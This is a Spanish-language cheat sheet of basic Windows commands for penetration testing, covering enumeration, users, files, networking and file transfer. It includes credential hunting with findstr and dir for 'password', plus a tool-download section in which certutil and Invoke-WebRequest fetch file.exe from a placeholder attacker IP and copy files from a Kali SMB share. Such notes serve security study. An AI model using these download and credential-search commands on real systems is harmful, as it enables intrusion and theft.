---
title: Comandos Básicos Windows
pubDate: '2025-09-30'
---

## Índice
- [Información del Sistema (Enumeración)](#recolectar)
- [Gestión de Usuarios](#usuarios)
- [Operaciones con Ficheros](#ficheros)
- [Networking y Puertos](#net)
- [Transferencia de Archivos](#transferencia)

## Información del Sistema (Enumeración)
```powershell
# Información general (OS, Parches/Hotfixes instalados)
systeminfo

# Listar parches instalados (Clave para buscar exploits de elevación de privilegios)
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Privilegios del usuario actual (Busca: SeImpersonatePrivilege, SeDebugPrivilege)
whoami /priv

# Ver arquitectura y variables de entorno
echo %PROCESSOR_ARCHITECTURE%
set
```

<a name="usuarios"></a>
## Gestión de Usuarios
```powershell
# Listar usuarios del sistema
net user

# Detalles de un usuario específico
net user <usuario>

# Ver grupos locales (ej: Administradores, Remote Management Users)
net localgroup

# Ver miembros de un grupo específico
net localgroup Administradores

# Cambiar contraseña (Requiere privilegios)
net user <usuario> <nueva_password>
```

<a name="ficheros"></a>
## Operaciones con Ficheros
```powershell
# Listar todo (incluyendo ocultos)
dir /a

# Buscar archivos con la palabra "password" en el nombre (recursivo)
dir /s *password*

# Buscar una cadena de texto dentro de archivos (recursivo, ignorar mayúsculas)
findstr /si "password" *.txt *.config *.xml

# Ver permisos de un archivo (ACLs)
icacls <fichero>
```

<a name="net"></a>
## Networking y Puertos
```powershell
# Configuración de red detallada
ipconfig /all

# Ver puertos abiertos y el ID del proceso (PID) asociado
netstat -ano

# Listar tablas de rutas
route print

# Ver recursos compartidos en una IP específica
net view \\<IP> /all

# Tabla ARP
arp -a
```

<a name="transferencia"></a>
## Transferencia de Archivos (Descarga de herramientas)
```powershell
# Método 1: Certutil (Clásico)
certutil.exe -urlcache -split -f http://<IP_ATACANTE>/file.exe file.exe

# Método 2: PowerShell (Moderno y recomendado)
powershell -c "Invoke-WebRequest -Uri 'http://<IP_ATACANTE>/file.exe' -OutFile 'file.exe'"

# Método 3: SMB (Desde tu Kali con Impacket-smbserver)
# En Kali: impacket-smbserver share . -smb2support
# En Windows:
copy \\<IP_KALI>\share\file.exe .
```

## Recursos Adicionales
- [Windows Cheatsheet AIO (StationX)](https://stationx.net/windows-command-line-cheat-sheet/)
